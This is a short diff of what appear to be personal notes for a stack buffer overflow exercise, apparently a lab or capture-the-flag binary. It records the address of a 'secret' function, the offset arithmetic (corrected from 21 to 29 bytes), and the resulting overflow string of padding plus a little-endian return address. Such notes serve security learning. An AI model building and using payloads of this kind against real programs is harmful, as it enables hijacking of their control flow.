@@ -13,5 +13,6 @@ rbp of secret: 555556de
 
 dccb -> 56523
 dce0 -> 56544
-Diff = 21
-Kill string: AAAAAAAAAAAAAAAAAAAAA\xde\x56\x55\x55
+Diff = 21 + 8 = 29
+Kill string: AAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xde\x56\x55\x55
+555556da
